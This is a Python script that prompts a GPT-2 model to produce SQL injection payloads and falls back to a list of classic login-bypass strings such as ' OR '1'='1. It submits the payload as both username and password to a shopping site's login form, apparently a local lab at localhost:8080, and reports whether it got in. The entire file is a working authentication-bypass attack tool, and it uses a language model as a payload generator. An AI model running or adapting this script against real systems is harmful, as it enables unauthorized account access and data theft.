import requests
from transformers import GPT2Tokenizer, GPT2LMHeadModel
import torch
import logging

# Configure logging
logging.basicConfig(
    filename='sql_injection_logs.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Model setup
device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
model = GPT2LMHeadModel.from_pretrained('gpt2')
model.to(device)
model.eval()

# Vulnerable website login page
login_url = "http://localhost:8080/shopping/login.php"

# Generate SQL injection payload using GPT-2
def generate_sql_payload():
    prompt = "Generate a SQL injection payload for bypassing login forms. Example: ' OR '1'='1"
    inputs = tokenizer(prompt, return_tensors='pt').to(device)
    with torch.no_grad():
        outputs = model.generate(
            inputs.input_ids,
            max_length=50,
            num_return_sequences=1,
            do_sample=True,
            temperature=0.7
        )
    payload = tokenizer.decode(outputs[0], skip_special_tokens=True)
    print(f"Raw Generated Payload: {payload}")
    logging.info(f"Raw Generated Payload: {payload}")
    return extract_sql_payload(payload)

# Extract SQL payload from generated text
def extract_sql_payload(text):
    sql_candidates = ["' OR '1'='1", "' OR 'a'='a", "' OR 1=1 --"]
    for candidate in sql_candidates:
        if candidate in text:
            return candidate
    return text  # Return the generated payload as-is if no match

# Perform SQL injection on the login page
def perform_sql_injection(sql_payload):
    # Use the same payload for both username and password
    data = {
        "name": sql_payload,
        "password": sql_payload,
        "Login": "Login"
    }
    
    # Submit the form
    response = requests.post(login_url, data=data)
    
    # Check if the response indicates successful login
    if "Welcome" in response.text or "Dashboard" in response.text:
        print("[+] SQL Injection Successful! Logged in.")
        logging.info(f"[+] SQL Injection Successful with Payload: {sql_payload}")
    else:
        print("[-] SQL Injection Failed.")
        logging.warning("[-] SQL Injection Failed.")

# Main workflow
def run():
    # Generate a single SQL payload
    sql_payload = generate_sql_payload()
    print(f"Generated SQL Payload: {sql_payload}")
    
    # Perform SQL injection using the same payload for both fields
    perform_sql_injection(sql_payload)

if __name__ == "__main__":
    run()
